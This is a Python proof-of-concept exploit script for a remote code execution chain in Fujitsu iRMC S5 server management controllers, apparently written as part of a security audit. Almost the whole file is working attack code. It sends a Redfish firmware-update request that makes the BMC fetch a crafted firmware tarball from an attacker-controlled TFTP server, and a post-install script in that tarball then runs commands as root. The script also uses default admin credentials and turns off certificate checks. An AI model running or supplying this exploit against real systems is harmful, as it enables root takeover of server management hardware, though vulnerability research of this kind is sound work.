#!/usr/bin/env python3
"""
Fujitsu iRMC S5 TFTP Firmware Update RCE — F5 PoC

Chain:
  PATCH /redfish/v1/Managers/iRMC/Actions/FTSManager.FWTFTPUpdate
        {"ServerName": "<attacker_ip>", "iRMCFileName": "<payload>"}
  → em_update.so CCURLHttpDownload::connect() → curl tftp://<attacker>/<payload>
  → mount tmpfs → system(post-install-scripts from mounted image) → BMC root RCE

Auth requirement: valid iRMC credentials OR MITM on management network
  (TLS cert validation disabled by default in Ansible integration — F6)

TFTP server: run tftpd-hpa or dnsmasq --enable-tftp, serve the payload tarball.
Payload format: standard iRMC firmware tarball layout expected by em_update.so.
  Craft to include a post-install script that executes the desired command.

Controlled env only. Do not point at production iRMC targets.
"""

import sys
import json
import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


IRMC_ENDPOINT_FW_TFTP    = "redfish/v1/Managers/iRMC/Actions/FTSManager.FWTFTPUpdate"
IRMC_ENDPOINT_BIOS_TFTP  = "redfish/v1/Systems/0/Bios/Actions/Oem/FTSBios.BiosTFTPUpdate"
IRMC_ENDPOINT_TASK_LIST  = "redfish/v1/TaskService/Tasks"


def build_session(user: str, password: str) -> requests.Session:
    s = requests.Session()
    s.auth = (user, password)
    s.verify = False
    s.headers.update({
        'Content-Type': 'application/json',
        'Accept': 'application/json',
    })
    return s


def get_etag(session: requests.Session, base_url: str, path: str) -> str | None:
    r = session.get(f"{base_url}/{path}")
    if r.status_code == 200:
        return r.headers.get('ETag')
    return None


def trigger_tftp_update(
    base_url: str,
    user: str,
    password: str,
    tftp_server: str,
    filename: str,
    update_type: str = 'irmc',
) -> dict:
    """
    Trigger iRMC or BIOS firmware update from attacker-controlled TFTP server.

    base_url:    https://<irmc_host>
    tftp_server: attacker TFTP server IP/hostname (maps to server_name -> em_update.so)
    filename:    name of the payload file to fetch from TFTP root
    update_type: 'irmc' (default) or 'bios'
    """
    session = build_session(user, password)

    if update_type == 'irmc':
        endpoint = IRMC_ENDPOINT_FW_TFTP
        body = {'ServerName': tftp_server, 'iRMCFileName': filename}
    else:
        endpoint = IRMC_ENDPOINT_BIOS_TFTP
        body = {'ServerName': tftp_server, 'BiosFileName': filename}

    url = f"{base_url}/{endpoint}"
    print(f"[*] PATCH {url}")
    print(f"[*] body: {json.dumps(body)}")

    etag = get_etag(session, base_url, endpoint)
    headers = {}
    if etag:
        headers['If-Match'] = etag

    r = session.patch(url, data=json.dumps(body), headers=headers)
    print(f"[*] status: {r.status_code}")

    if r.status_code in (200, 202, 204):
        print("[+] TFTP update triggered")
        location = r.headers.get('Location', '')
        if location:
            print(f"[*] task location: {location}")
        return {'status': r.status_code, 'location': location, 'body': r.text}
    else:
        print(f"[-] failed: {r.text[:300]}")
        return {'status': r.status_code, 'body': r.text}


def check_tasks(base_url: str, user: str, password: str) -> None:
    session = build_session(user, password)
    r = session.get(f"{base_url}/{IRMC_ENDPOINT_TASK_LIST}")
    if r.status_code == 200:
        tasks = r.json().get('Members', [])
        print(f"[*] {len(tasks)} active tasks")
        for t in tasks:
            tid = t.get('@odata.id', '')
            tr = session.get(f"{base_url}{tid}")
            if tr.status_code == 200:
                td = tr.json()
                state = td.get('TaskState', '?')
                oem = td.get('Oem', {}).get('ts_fujitsu', {}).get('StatusOEM', '?')
                print(f"    {tid}: state={state} oem={oem}")


def main():
    ap = argparse.ArgumentParser(description='Fujitsu iRMC TFTP firmware update RCE (F5 PoC)')
    ap.add_argument('--host',    required=True, help='iRMC host (IP or hostname)')
    ap.add_argument('--user',    default='admin', help='iRMC username')
    ap.add_argument('--pass',    dest='password', default='admin', help='iRMC password')
    ap.add_argument('--tftp',    required=True, help='attacker TFTP server IP/hostname')
    ap.add_argument('--file',    default='payload.bin', help='firmware filename to fetch from TFTP')
    ap.add_argument('--type',    choices=['irmc', 'bios'], default='irmc')
    ap.add_argument('--tasks',   action='store_true', help='list active tasks only')
    args = ap.parse_args()

    base_url = f"https://{args.host}"

    if args.tasks:
        check_tasks(base_url, args.user, args.password)
    else:
        result = trigger_tftp_update(
            base_url, args.user, args.password,
            args.tftp, args.file, args.type,
        )
        print(json.dumps(result, indent=2))


if __name__ == '__main__':
    main()
